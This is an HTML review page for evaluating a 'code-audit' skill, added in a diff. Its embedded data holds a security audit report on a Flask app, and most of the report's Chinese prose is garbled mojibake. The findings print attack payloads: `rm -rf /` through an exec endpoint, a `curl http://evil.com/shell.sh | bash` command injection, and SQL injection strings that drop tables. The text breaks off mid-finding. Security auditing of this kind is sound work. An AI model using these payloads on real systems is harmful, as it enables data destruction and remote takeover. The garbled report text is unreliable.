@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Eval Review</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&family=Lora:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js" integrity="sha384-EnyY0/GSHQGSxSgMwaIPzSESbqoOLSexfnSMN2AP+39Ckmn92stwABZynq1JyzdT" crossorigin="anonymous"></script>
+  <style>
+    :root {
+      --bg: #faf9f5;
+      --surface: #ffffff;
+      --border: #e8e6dc;
+      --text: #141413;
+      --text-muted: #b0aea5;
+      --accent: #d97757;
+      --accent-hover: #c4613f;
+      --green: #788c5d;
+      --green-bg: #eef2e8;
+      --red: #c44;
+      --red-bg: #fceaea;
+      --header-bg: #141413;
+      --header-text: #faf9f5;
+      --radius: 6px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Lora', Georgia, serif;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ---- Header ---- */
+    .header {
+      background: var(--header-bg);
+      color: var(--header-text);
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-shrink: 0;
+    }
+    .header h1 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 1.25rem;
+      font-weight: 600;
+    }
+    .header .instructions {
+      font-size: 0.8rem;
+      opacity: 0.7;
+      margin-top: 0.25rem;
+    }
+    .header .progress {
+      font-size: 0.875rem;
+      opacity: 0.8;
+      text-align: right;
+    }
+
+    /* ---- Main content ---- */
+    .main {
+      flex: 1;
+      overflow-y: auto;
+      padding: 1.5rem 2rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+
+    /* ---- Sections ---- */
+    .section {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      flex-shrink: 0;
+    }
+    .section-header {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.75rem 1rem;
+      font-size: 0.75rem;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+      background: var(--bg);
+    }
+    .section-body {
+      padding: 1rem;
+    }
+
+    /* ---- Config badge ---- */
+    .config-badge {
+      display: inline-block;
+      padding: 0.2rem 0.625rem;
+      border-radius: 9999px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.6875rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+      margin-left: 0.75rem;
+      vertical-align: middle;
+    }
+    .config-badge.config-primary {
+      background: rgba(33, 150, 243, 0.12);
+      color: #1976d2;
+    }
+    .config-badge.config-baseline {
+      background: rgba(255, 193, 7, 0.15);
+      color: #f57f17;
+    }
+
+    /* ---- Prompt ---- */
+    .prompt-text {
+      white-space: pre-wrap;
+      font-size: 0.9375rem;
+      line-height: 1.6;
+    }
+
+    /* ---- Outputs ---- */
+    .output-file {
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+    }
+    .output-file + .output-file {
+      margin-top: 1rem;
+    }
+    .output-file-header {
+      padding: 0.5rem 0.75rem;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+      font-family: 'SF Mono', SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .output-file-header .dl-btn {
+      font-size: 0.7rem;
+      color: var(--accent);
+      text-decoration: none;
+      cursor: pointer;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-weight: 500;
+      opacity: 0.8;
+    }
+    .output-file-header .dl-btn:hover {
+      opacity: 1;
+      text-decoration: underline;
+    }
+    .output-file-content {
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+    .output-file-content pre {
+      font-size: 0.8125rem;
+      line-height: 1.5;
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-family: 'SF Mono', SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
+    }
+    .output-file-content img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 4px;
+    }
+    .output-file-content iframe {
+      width: 100%;
+      height: 600px;
+      border: none;
+    }
+    .output-file-content table {
+      border-collapse: collapse;
+      font-size: 0.8125rem;
+      width: 100%;
+    }
+    .output-file-content table td,
+    .output-file-content table th {
+      border: 1px solid var(--border);
+      padding: 0.375rem 0.5rem;
+      text-align: left;
+    }
+    .output-file-content table th {
+      background: var(--bg);
+      font-weight: 600;
+    }
+    .output-file-content .download-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.5rem 1rem;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--accent);
+      text-decoration: none;
+      font-size: 0.875rem;
+      cursor: pointer;
+    }
+    .output-file-content .download-link:hover {
+      background: var(--border);
+    }
+    .empty-state {
+      color: var(--text-muted);
+      font-style: italic;
+      padding: 2rem;
+      text-align: center;
+    }
+
+    /* ---- Feedback ---- */
+    .prev-feedback {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.625rem 0.75rem;
+      margin-top: 0.75rem;
+      font-size: 0.8125rem;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+    .prev-feedback-label {
+      font-size: 0.7rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      margin-bottom: 0.25rem;
+      color: var(--text-muted);
+    }
+    .feedback-textarea {
+      width: 100%;
+      min-height: 100px;
+      padding: 0.75rem;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      font-family: inherit;
+      font-size: 0.9375rem;
+      line-height: 1.5;
+      resize: vertical;
+      color: var(--text);
+    }
+    .feedback-textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+    }
+    .feedback-status {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      margin-top: 0.5rem;
+      min-height: 1.1em;
+    }
+
+    /* ---- Grades (collapsible) ---- */
+    .grades-toggle {
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      user-select: none;
+    }
+    .grades-toggle:hover {
+      color: var(--accent);
+    }
+    .grades-toggle .arrow {
+      margin-right: 0.5rem;
+      transition: transform 0.15s;
+      font-size: 0.75rem;
+    }
+    .grades-toggle .arrow.open {
+      transform: rotate(90deg);
+    }
+    .grades-content {
+      display: none;
+      margin-top: 0.75rem;
+    }
+    .grades-content.open {
+      display: block;
+    }
+    .grades-summary {
+      font-size: 0.875rem;
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .grade-badge {
+      display: inline-block;
+      padding: 0.125rem 0.5rem;
+      border-radius: 9999px;
+      font-size: 0.75rem;
+      font-weight: 600;
+    }
+    .grade-pass { background: var(--green-bg); color: var(--green); }
+    .grade-fail { background: var(--red-bg); color: var(--red); }
+    .assertion-list {
+      list-style: none;
+    }
+    .assertion-item {
+      padding: 0.625rem 0;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.8125rem;
+    }
+    .assertion-item:last-child { border-bottom: none; }
+    .assertion-status {
+      font-weight: 600;
+      margin-right: 0.5rem;
+    }
+    .assertion-status.pass { color: var(--green); }
+    .assertion-status.fail { color: var(--red); }
+    .assertion-evidence {
+      color: var(--text-muted);
+      font-size: 0.75rem;
+      margin-top: 0.25rem;
+      padding-left: 1.5rem;
+    }
+
+    /* ---- View tabs ---- */
+    .view-tabs {
+      display: flex;
+      gap: 0;
+      padding: 0 2rem;
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    .view-tab {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.625rem 1.25rem;
+      font-size: 0.8125rem;
+      font-weight: 500;
+      cursor: pointer;
+      border: none;
+      background: none;
+      color: var(--text-muted);
+      border-bottom: 2px solid transparent;
+      transition: all 0.15s;
+    }
+    .view-tab:hover { color: var(--text); }
+    .view-tab.active {
+      color: var(--accent);
+      border-bottom-color: var(--accent);
+    }
+    .view-panel { display: none; }
+    .view-panel.active { display: flex; flex-direction: column; flex: 1; overflow: hidden; }
+
+    /* ---- Benchmark view ---- */
+    .benchmark-view {
+      padding: 1.5rem 2rem;
+      overflow-y: auto;
+      flex: 1;
+    }
+    .benchmark-table {
+      border-collapse: collapse;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      font-size: 0.8125rem;
+      width: 100%;
+      margin-bottom: 1.5rem;
+    }
+    .benchmark-table th, .benchmark-table td {
+      padding: 0.625rem 0.75rem;
+      text-align: left;
+      border: 1px solid var(--border);
+    }
+    .benchmark-table th {
+      font-family: 'Poppins', sans-serif;
+      background: var(--header-bg);
+      color: var(--header-text);
+      font-weight: 500;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .benchmark-table tr:hover { background: var(--bg); }
+    .benchmark-table tr.benchmark-row-with { background: rgba(33, 150, 243, 0.06); }
+    .benchmark-table tr.benchmark-row-without { background: rgba(255, 193, 7, 0.06); }
+    .benchmark-table tr.benchmark-row-with:hover { background: rgba(33, 150, 243, 0.12); }
+    .benchmark-table tr.benchmark-row-without:hover { background: rgba(255, 193, 7, 0.12); }
+    .benchmark-table tr.benchmark-row-avg { font-weight: 600; border-top: 2px solid var(--border); }
+    .benchmark-table tr.benchmark-row-avg.benchmark-row-with { background: rgba(33, 150, 243, 0.12); }
+    .benchmark-table tr.benchmark-row-avg.benchmark-row-without { background: rgba(255, 193, 7, 0.12); }
+    .benchmark-delta-positive { color: var(--green); font-weight: 600; }
+    .benchmark-delta-negative { color: var(--red); font-weight: 600; }
+    .benchmark-notes {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1rem;
+    }
+    .benchmark-notes h3 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.875rem;
+      margin-bottom: 0.75rem;
+    }
+    .benchmark-notes ul {
+      list-style: disc;
+      padding-left: 1.25rem;
+    }
+    .benchmark-notes li {
+      font-size: 0.8125rem;
+      line-height: 1.6;
+      margin-bottom: 0.375rem;
+    }
+    .benchmark-empty {
+      color: var(--text-muted);
+      font-style: italic;
+      text-align: center;
+      padding: 3rem;
+    }
+
+    /* ---- Navigation ---- */
+    .nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+      border-top: 1px solid var(--border);
+      background: var(--surface);
+      flex-shrink: 0;
+    }
+    .nav-btn {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.5rem 1.25rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      cursor: pointer;
+      font-size: 0.875rem;
+      font-weight: 500;
+      color: var(--text);
+      transition: all 0.15s;
+    }
+    .nav-btn:hover:not(:disabled) {
+      background: var(--bg);
+      border-color: var(--text-muted);
+    }
+    .nav-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+    .done-btn {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.5rem 1.5rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      color: var(--text);
+      cursor: pointer;
+      font-size: 0.875rem;
+      font-weight: 500;
+      transition: all 0.15s;
+    }
+    .done-btn:hover {
+      background: var(--bg);
+      border-color: var(--text-muted);
+    }
+    .done-btn.ready {
+      border: none;
+      background: var(--accent);
+      color: white;
+      font-weight: 600;
+    }
+    .done-btn.ready:hover {
+      background: var(--accent-hover);
+    }
+    /* ---- Done overlay ---- */
+    .done-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+    }
+    .done-overlay.visible {
+      display: flex;
+    }
+    .done-card {
+      background: var(--surface);
+      border-radius: 12px;
+      padding: 2rem 3rem;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 500px;
+    }
+    .done-card h2 {
+      font-size: 1.5rem;
+      margin-bottom: 0.5rem;
+    }
+    .done-card p {
+      color: var(--text-muted);
+      margin-bottom: 1.5rem;
+      line-height: 1.5;
+    }
+    .done-card .btn-row {
+      display: flex;
+      gap: 0.5rem;
+      justify-content: center;
+    }
+    .done-card button {
+      padding: 0.5rem 1.25rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      cursor: pointer;
+      font-size: 0.875rem;
+    }
+    .done-card button:hover {
+      background: var(--bg);
+    }
+    /* ---- Toast ---- */
+    .toast {
+      position: fixed;
+      bottom: 5rem;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--header-bg);
+      color: var(--header-text);
+      padding: 0.625rem 1.25rem;
+      border-radius: var(--radius);
+      font-size: 0.875rem;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+      z-index: 200;
+    }
+    .toast.visible {
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+  <div id="app" style="height:100vh; display:flex; flex-direction:column;">
+    <div class="header">
+      <div>
+        <h1>Eval Review: <span id="skill-name"></span></h1>
+        <div class="instructions">Review each output and leave feedback below. Navigate with arrow keys or buttons. When done, copy feedback and paste into Claude Code.</div>
+      </div>
+      <div class="progress" id="progress"></div>
+    </div>
+
+    <!-- View tabs (only shown when benchmark data exists) -->
+    <div class="view-tabs" id="view-tabs" style="display:none;">
+      <button class="view-tab active" onclick="switchView('outputs')">Outputs</button>
+      <button class="view-tab" onclick="switchView('benchmark')">Benchmark</button>
+    </div>
+
+    <!-- Outputs panel (qualitative review) -->
+    <div class="view-panel active" id="panel-outputs">
+    <div class="main">
+      <!-- Prompt -->
+      <div class="section">
+        <div class="section-header">Prompt <span class="config-badge" id="config-badge" style="display:none;"></span></div>
+        <div class="section-body">
+          <div class="prompt-text" id="prompt-text"></div>
+        </div>
+      </div>
+
+      <!-- Outputs -->
+      <div class="section">
+        <div class="section-header">Output</div>
+        <div class="section-body" id="outputs-body">
+          <div class="empty-state">No output files found</div>
+        </div>
+      </div>
+
+      <!-- Previous Output (collapsible) -->
+      <div class="section" id="prev-outputs-section" style="display:none;">
+        <div class="section-header">
+          <div class="grades-toggle" onclick="togglePrevOutputs()">
+            <span class="arrow" id="prev-outputs-arrow">&#9654;</span>
+            Previous Output
+          </div>
+        </div>
+        <div class="grades-content" id="prev-outputs-content"></div>
+      </div>
+
+      <!-- Grades (collapsible) -->
+      <div class="section" id="grades-section" style="display:none;">
+        <div class="section-header">
+          <div class="grades-toggle" onclick="toggleGrades()">
+            <span class="arrow" id="grades-arrow">&#9654;</span>
+            Formal Grades
+          </div>
+        </div>
+        <div class="grades-content" id="grades-content"></div>
+      </div>
+
+      <!-- Feedback -->
+      <div class="section">
+        <div class="section-header">Your Feedback</div>
+        <div class="section-body">
+          <textarea
+            class="feedback-textarea"
+            id="feedback"
+            placeholder="What do you think of this output? Any issues, suggestions, or things that look great?"
+          ></textarea>
+          <div class="feedback-status" id="feedback-status"></div>
+          <div class="prev-feedback" id="prev-feedback" style="display:none;">
+            <div class="prev-feedback-label">Previous feedback</div>
+            <div id="prev-feedback-text"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="nav" id="outputs-nav">
+      <button class="nav-btn" id="prev-btn" onclick="navigate(-1)">&#8592; Previous</button>
+      <button class="done-btn" id="done-btn" onclick="showDoneDialog()">Submit All Reviews</button>
+      <button class="nav-btn" id="next-btn" onclick="navigate(1)">Next &#8594;</button>
+    </div>
+    </div><!-- end panel-outputs -->
+
+    <!-- Benchmark panel (quantitative stats) -->
+    <div class="view-panel" id="panel-benchmark">
+      <div class="benchmark-view" id="benchmark-content">
+        <div class="benchmark-empty">No benchmark data available. Run a benchmark to see quantitative results here.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Done overlay -->
+  <div class="done-overlay" id="done-overlay">
+    <div class="done-card">
+      <h2>Review Complete</h2>
+      <p>Your feedback has been saved. Go back to your Claude Code session and tell Claude you're done reviewing.</p>
+      <div class="btn-row">
+        <button onclick="closeDoneDialog()">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // ---- Embedded data (injected by generate_review.py) ----
+    const EMBEDDED_DATA = {"skill_name": "code-audit", "runs": [{"id": "webapp-flask-with_skill", "prompt": "\u5e2e\u6211\u5ba1\u8ba1\u4e00\u4e0b evals/files/case1_webapp.py \u8fd9\u4e2a Flask \u5e94\u7528\u7684\u5b89\u5168\u6027\uff0c\u8f93\u51fa\u5b8c\u6574\u7684\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a\u3002", "eval_id": 0, "outputs": [{"name": "audit_report.md", "type": "text", "content": "# \u7039\u590a\u53cf\u7039\u00a4\ufffd\u2103\u59e4\u935b\ufffd\n\n## \u7039\u00a4\ufffd\u2103\u61b3\u7455\ufffd\n- **\u7039\u00a4\ufffd\u00a4\u5bd6\u9365\ufffd**\u951b\u6b5acase1_webapp.py`\n- **\u7039\u00a4\ufffd\u2103\u6902\u95c2\ufffd**\u951b\ufffd2026-06-18\n- **\u93c2\u56e6\u6b22\u93c1\u4f34\u567a**\u951b\ufffd1\n- **\u9359\u6220\u5e47\u95c2\ufffd\u68f0\ufffd**\u951b\ufffd8\u951b\u5715ritical: 3, High: 3, Medium: 0, Low: 2\u951b\ufffd\n\n## \u9359\u6220\u5e47\u5a13\u546d\u5d1f\n\n---\n\n### [Critical] \u6d60\uff47\u721c\u5a09\u3125\u53c6 (exec) \u9225\ufffd case1_webapp.py:56-58\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aexec()` \u9429\u5b58\u5e34\u93b5\u0446\ufffd\u5c7e\u6f75\u9477\ufffd URL \u93cc\u30e8\ufffd\u3220\u5f2c\u93c1\u626e\u6b91\u9422\u3126\u57db\u6748\u64b3\u53c6\u951b\u5c7e\u657e\u9351\u660f\ufffd\u546d\u5f72\u93b5\u0446\ufffd\u5c7c\u6362\u93b0\ufffd Python \u6d60\uff47\u721c\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\n@app.route('/admin/exec')\ndef admin_exec():\n    code = request.args.get('code', '')\n    exec(code)\n    return 'OK'\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u95ab\u6c33\u7e43 `/admin/exec?code=__import__('os').system('rm -rf /')` \u7edb\ufffd Payload \u9366\u3126\u6e47\u9354\u2033\u6ad2\u6d93\u5a43\u58bd\u741b\u5c7c\u6362\u93b0\ufffd Python \u6d60\uff47\u721c\u951b\u5c7d\u5bd8\u93b7\ufffd\u7487\u8bf2\u5553\u93c2\u56e6\u6b22\u9286\u4f78\u5f3d\u5bee\ufffd Shell\u9286\u4f7a\u734c\u9359\u6828\u669f\u93b9\ufffd\u9286\u4f79\u00ed\u935a\u6220\u0429\u9354\u3127\u74d1\u9286\u509d\u7e56\u93c4\ufffd\u93c8\ufffd\u6942\u6a3c\u9a87\u9352\ufffd\u9428\u52eb\u7568\u934f\u3126\u7d21\u5a32\u70aa\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-94\u951b\u5715ode Injection\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\n# \u7039\u5c7d\u53cf\u9352\u72bb\u6ace\u59dd\u3087\ufffd\ufffd\u9410\u5e7f\ufffd\u509a\ufffd\u509b\u7049\u8e47\u5474\u300f\u6dc7\u6fc8\u6680\u9354\u3126\ufffd\u4f79\u58bd\u741b\u5c83\u5158\u9354\u6db3\u7d1d\u6d63\u8de8\u6564\u9427\u85c9\u6095\u9357\u66ea\u7d30\nALLOWED_COMMANDS = {\n    'hello': lambda: 'Hello, World!',\n    'status': lambda: 'System OK',\n}\n\n@app.route('/admin/exec')\ndef admin_exec():\n    cmd = request.args.get('code', '')\n    if cmd not in ALLOWED_COMMANDS:\n        return 'Invalid command', 403\n    result = ALLOWED_COMMANDS[cmd]()\n    return f'Result: {result}'\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-community/attacks/Code_Injection\n\n---\n\n### [Critical] \u935b\u6212\u62a4\u5a09\u3125\u53c6 (Command Injection) \u9225\ufffd case1_webapp.py:49-50\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aos.system()` \u9429\u5b58\u5e34\u93b5\u0446\ufffd\u5c7d\u5bd8\u935a\ufffd\u9422\u3126\u57db\u6748\u64b3\u53c6\u951b\u5744request.args.get('file')`\u951b\u590b\u5afe\u93ba\u30e7\u6b91 Shell \u935b\u6212\u62a4\u951b\u5c7e\u657e\u9351\u660f\ufffd\u546d\u5f72\u5a09\u3125\u53c6\u6d60\u7ed8\u5270\u7eef\u8364\u7cba\u935b\u6212\u62a4\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\n@app.route('/export')\ndef export_data():\n    filename = request.args.get('file', 'export.csv')\n    cmd = f'cat /tmp/{filename}'\n    os.system(cmd)\n    return 'Export complete'\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u95ab\u6c33\u7e43 `/export?file=;id;whoami;` \u93b4\ufffd `/export?file=export.csv;curl http://evil.com/shell.sh | bash` \u5a09\u3125\u53c6\u6d60\u7ed8\u5270 Shell \u935b\u6212\u62a4\u951b\u5c83\u5e4f\u5bf0\u6941\u6e47\u9354\u2033\u6ad2\u7039\u5c7d\u53cf\u93ba\u0443\u57d7\u93c9\u51a6\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-78\u951b\u5724S Command Injection\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport subprocess\nimport os.path\n\nEXPORT_DIR = '/tmp'\n\n@app.route('/export')\ndef export_data():\n    filename = request.args.get('file', 'export.csv')\n    # \u74ba\ufffd\u5bf0\u52ee\ufffd\u52ee\u5bd6\u9356\ufffd + \u9427\u85c9\u6095\u9357\u66e2\u7359\u7487\ufffd\n    safe_path = os.path.normpath(filename)\n    abs_path = os.path.abspath(os.path.join(EXPORT_DIR, safe_path))\n    \n    # \u7ead\ufffd\u6dc7\u6fc7\u6783\u6d60\u8dfa\u6e6a\u934f\u4f7d\ufffd\u54e5\u6d30\u8930\u66de\u5534\n    if not abs_path.startswith(os.path.abspath(EXPORT_DIR)):\n        return 'Access denied', 403\n    \n    # \u6d63\u8de8\u6564 subprocess.run \u6d7c\u72b2\u5f2c\u9352\u6944\u3003\u951b\u5c84\u4f29\u934f\ufffd shell=True\n    try:\n        result = subprocess.run(['cat', abs_path], capture_output=True, text=True, timeout=5)\n        return result.stdout\n    except subprocess.TimeoutExpired:\n        return 'Timeout', 500\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-community/attacks/Command_Injection\n\n---\n\n### [Critical] \u7ead\ufffd\u7f02\u682b\u721c\u7035\u55db\u631c (Hardcoded Secret) \u9225\ufffd case1_webapp.py:9\n\n**\u93bb\u5fda\u582a**\u951b\u6b36lask \u9428\ufffd `SECRET_KEY`\u951b\u5744'my-secret-key-123456'`\u951b\u590c\u6d3f\u93ba\u30e7\u2016\u7f02\u682b\u721c\u9366\u3126\u7c2e\u6d60\uff47\u721c\u6d93\ufffd\u951b\u5c83\ufffd\u30e5\u7611\u95bd\u30e7\u6564\u6d5c\ufffd Session \u7edb\u60e7\u6095\u9286\u4e06SRF Token \u7edb\u590a\u7568\u934f\u3126\u6e80\u9352\u8eb2\ufffd\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\napp.config['SECRET_KEY'] = 'my-secret-key-123456'\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\ufffd\n1. \u6fe1\u509b\u7049\u6d60\uff47\u721c\u5a09\u52ef\u6e76\u9352\u677f\u53d5\u5bee\ufffd\u6d60\u64b3\u7c31\u951b\u5719itHub \u7edb\u591b\u7d1a\u951b\u5c7d\u7611\u95bd\u30e4\u7a76\u934f\u3127\u7d89\u9359\ufffd\u7459\ufffd\n2. \u93c0\u8bf2\u56ae\u9470\u546d\u5f72\u9422\u3126\ufffd\u3085\u7611\u95bd\u30e4\u5409\u95ab\ufffd Flask Session\u951b\u5c7d\u7584\u941c\u62cc\u97e9\u6d60\u6212\u5409\u95ab\u72b2\u62f0 Session \u9354\ufffd\u93b8\ufffd\n3. \u7487\u30e5\u7611\u95bd\u30e8\u7e43\u6d5c\u5ea3\u755d\u9357\u66ea\u7d1d\u9357\u5145\u5a07\u6d93\u5d86\u7860\u95c7\u8e6d\u7bc3\u7039\u89c4\u69d7\u741a\ufffd\u93c6\u6751\u59cf\u941a\u6ec6\u0412\n\n**CWE**\u951b\u6b33WE-798\u951b\u571aardcoded Credentials\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport os\nimport secrets\n\n# \u93c2\u89c4\ufffd\u581c\u7af4\u951b\u6c2b\u7ca0\u941c\ufffd\u6fa7\u51a8\u5f49\u95b2\u5fda\ufffd\u8bf2\u5f47\napp.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY')\n\n# \u93c2\u89c4\ufffd\u581c\u7c29\u951b\u6c33\u7e4d\u741b\u5c7e\u6902\u95ab\u6c33\u7e43 secrets \u59af\u2033\u6f61\u9422\u71b8\u579a\u951b\u581f\u7621\u5a06\uffe0\u5678\u935a\ufffd\u935a\ufffd Session \u6fb6\u8fa8\u6665\u951b\ufffd\napp.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://flask.palletsprojects.com/en/stable/config/#SECRET_KEY\n\n---\n\n### [High] SQL \u5a09\u3125\u53c6 (SQL Injection) \u9225\ufffd case1_webapp.py:30-31\n\n**\u93bb\u5fda\u582a**\u951b\u6c2b\u5a07\u9422\ufffd f-string \u704f\u55d9\u6564\u93b4\u75af\u7ded\u934f\u30ef\u7d19`request.args.get('q')`\u951b\u590c\u6d3f\u93ba\u30e6\u5afe\u934f\ufffd SQL \u93cc\u30e8\ufffd\u3223\ufffd\ufffd\u9359\u30ef\u7d1d\u93c0\u8bf2\u56ae\u9470\u546d\u5f72\u7487\u8bf2\u5f47\u9286\u4f7a\ufffd\u2103\u657c\u93b4\u6827\u57b9\u95c4\u3086\u669f\u93b9\ufffd\u6434\u64b2\u8151\u6d60\u7ed8\u5270\u93c1\u7248\u5d41\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\nusername = request.args.get('q', '')\nconn = get_db()\ncursor = conn.cursor()\nquery = f\"SELECT * FROM users WHERE username = '{username}'\"\ncursor.execute(query)\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u95ab\u6c33\u7e43 `/search?q=' UNION SELECT 1,2,3,4,5 --` \u6769\u6d9c\ufffd\u5c83\u4ec8\u935a\u581f\u7161\u7487\u3221\u655e\u934f\u30ef\u7d1d\u7487\u8bf2\u5f47\u93c1\u7248\u5d41\u6434\u64b2\u6362\u93b0\u5fda\u3003\u9350\u546d\ufffd\u7678\u7d31\u93b4\u682d\ufffd\u6c33\u7e43 `/search?q='; DROP TABLE users; --` \u9352\u72bb\u6ace\u93c1\u7248\u5d41\u9286\u509c\u6571\u6d5c\u5e9d\u5a07\u9422\u3127\u6b91\u93c4\ufffd sqlite3\u951b\u5b78AL \u59af\u2033\u7d21\u935c\u5c84\u6aae\u9354\u72b3\u669f\u93b9\ufffd\u6434\u64b4\u657e\u9351\u8bb3\u7bc3\u9359\ufffd\u741b\u5c7b\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-89\u951b\u572bQL Injection\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\n@app.route('/search')\ndef search():\n    username = request.args.get('q', '')\n    conn = get_db()\n    cursor = conn.cursor()\n    # \u6d63\u8de8\u6564\u9359\u509b\u669f\u9356\u6828\u7161\u7487\ufffd\u951b\u581d\u5d30\u6d63\u5d87\ufffd\ufe3c\u7d1a\n    cursor.execute(\"SELECT * FROM users WHERE username = ?\", (username,))\n    results = cursor.fetchall()\n    conn.close()\n    \n    html = '<h2>Search Results</h2>'\n    for row in results:\n        # \u9422\u3126\u57db\u93c1\u7248\u5d41\u6748\u64b3\u56ad\u93c3\u60f0\u6d46\u6d94\ufffd\n        html += f'<p>{html.escape(str(row[0]))}: {html.escape(str(row[1]))}</p>'\n    return html\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-community/attacks/SQL_Injection\n\n---\n\n### [High] \u93c8\u5d85\u59df\u7ed4\ufffd\u59af\u2103\u6f98\u5a09\u3125\u53c6 (SSTI) \u9225\ufffd case1_webapp.py:41-43\n\n**\u93bb\u5fda\u582a**\u951b\u6b5arender_template_string()` 